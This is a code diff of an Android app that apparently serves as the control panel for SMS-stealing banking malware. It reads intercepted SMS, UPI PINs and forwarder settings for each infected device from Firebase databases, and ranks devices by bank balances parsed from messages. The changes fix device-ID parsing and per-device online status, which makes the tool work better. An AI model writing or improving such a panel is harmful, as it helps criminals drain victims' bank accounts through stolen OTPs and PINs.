@@ -33,6 +33,7 @@ import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import java.io.BufferedReader
 import java.io.InputStreamReader
+import java.util.LinkedHashSet
 
 data class DeviceRow(
     val firebaseUrl: String,
@@ -50,10 +51,14 @@ data class DeviceRow(
     val forwarderDisplay: String?,
     val maxBalance: Double,
     val smsCount: Int,
+    /** Unfiltered message count for this device (Virtus `23 / 1052` style). */
+    val totalRawSms: Int,
     val lastActivityMillis: Long,
     val previewSender: String,
     /** Recent SMS body snippet for list card (green Virtus-style line). */
     val previewBody: String,
+    /** Loaded from `clients/` only — bank filters hid all SMS but device still listed. */
+    val fromClientsOnly: Boolean,
 )
 
 data class DeviceDetail(
@@ -304,13 +309,18 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
     }
 }
 
+/**
+ * Virtus / Firebase paths look like `messages/<deviceId>/<pushKey>/...`.
+ * The device id is the segment **after** `messages`/`sms`/`inbox`, not the leaf key.
+ */
 private fun deviceIdFromPath(path: String): String {
     val parts = path.split("/").filter { it.isNotEmpty() }
+    if (parts.isEmpty()) return "unknown"
     val li = parts.map { it.lowercase() }
     val di = li.indexOf("devices")
     if (di >= 0 && di + 1 < parts.size) return parts[di + 1]
     val mi = li.indexOfFirst { it in setOf("messages", "sms", "inbox") }
-    if (mi > 0) return parts[mi - 1]
+    if (mi >= 0 && mi + 1 < parts.size) return parts[mi + 1]
     return parts.lastOrNull() ?: "unknown"
 }
 
@@ -392,19 +402,29 @@ private fun buildDeviceList(
     val q = searchQuery.trim().lowercase()
     val rows = mutableListOf<DeviceRow>()
     for (fr in results) {
-        if (!connectionOk(fr.online, cfg.connection)) continue
         val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
-        for ((devId, msgs) in byDev) {
+        val allDevIds = LinkedHashSet<String>().apply {
+            addAll(byDev.keys)
+            addAll(fr.devices.keys)
+        }
+        for (devId in allDevIds) {
+            val msgs = byDev[devId].orEmpty()
             val snap = fr.devices[devId]
             val devicePin = deviceHasPinResolved(msgs, snap)
             if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
             if (!matchesSearch(devId, fr.url, msgs, snap, q)) continue
             val filtered = filterSmsList(msgs, cfg)
-            if (filtered.isEmpty()) continue
+            val fromClientsOnly = filtered.isEmpty() && msgs.isEmpty() && snap != null
+            if (filtered.isEmpty()) {
+                if (msgs.isNotEmpty()) continue
+                if (!fromClientsOnly) continue
+            }
+            val deviceOnline = snap?.clientOnline ?: fr.online
+            if (!connectionOk(deviceOnline, cfg.connection)) continue
             val balances = filtered.mapNotNull { mainBalanceForSort(it.body) }
             val maxBal = balances.maxOrNull() ?: 0.0
             val times = filtered.mapNotNull { it.messageAtMillis }
-            val lastAct = times.maxOrNull() ?: 0L
+            val lastAct = times.maxOrNull() ?: (snap?.lastSeenMillis ?: 0L)
             val previewSms = filtered.maxByOrNull { it.messageAtMillis ?: 0L }
             val preview = previewSms?.sender?.ifBlank { "(sender)" } ?: ""
             val rawBody = previewSms?.body?.trim().orEmpty()
@@ -424,7 +444,7 @@ private fun buildDeviceList(
                 DeviceRow(
                     firebaseUrl = fr.url,
                     deviceId = devId,
-                    online = fr.online,
+                    online = deviceOnline,
                     deviceHasPin = devicePin,
                     upiPinDisplay = upiPin,
                     modelDisplay = model,
@@ -436,9 +456,11 @@ private fun buildDeviceList(
                     forwarderDisplay = snap?.forwarder?.takeIf { it.isNotBlank() },
                     maxBalance = maxBal,
                     smsCount = filtered.size,
+                    totalRawSms = msgs.size,
                     lastActivityMillis = lastAct,
                     previewSender = preview,
-                    previewBody = previewBody,
+                    previewBody = if (fromClientsOnly) "" else previewBody,
+                    fromClientsOnly = fromClientsOnly,
                 ),
             )
         }
@@ -470,10 +492,11 @@ private fun buildLiveFeedList(
     val out = mutableListOf<LiveSmsRow>()
     val label = smsKindLabel(cfg)
     for (fr in results) {
-        if (!connectionOk(fr.online, cfg.connection)) continue
         val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
         for ((devId, msgs) in byDev) {
             val snap = fr.devices[devId]
+            val deviceOnline = snap?.clientOnline ?: fr.online
+            if (!connectionOk(deviceOnline, cfg.connection)) continue
             val devicePin = deviceHasPinResolved(msgs, snap)
             if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
             if (!matchesSearch(devId, fr.url, msgs, snap, q)) continue
@@ -487,7 +510,7 @@ private fun buildLiveFeedList(
                         body = sms.body,
                         balance = mainBalanceForSort(sms.body),
                         messageAtMillis = sms.messageAtMillis,
-                        online = fr.online,
+                        online = deviceOnline,
                         kindLabel = label,
                     ),
                 )
@@ -528,7 +551,7 @@ private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: F
     return DeviceDetail(
         firebaseUrl = row.firebaseUrl,
         deviceId = row.deviceId,
-        online = fr.online,
+        online = row.online,
         deviceHasPin = devicePin,
         upiPinDisplay = resolveUpiPin(msgs, snap),
         modelDisplay = row.modelDisplay,
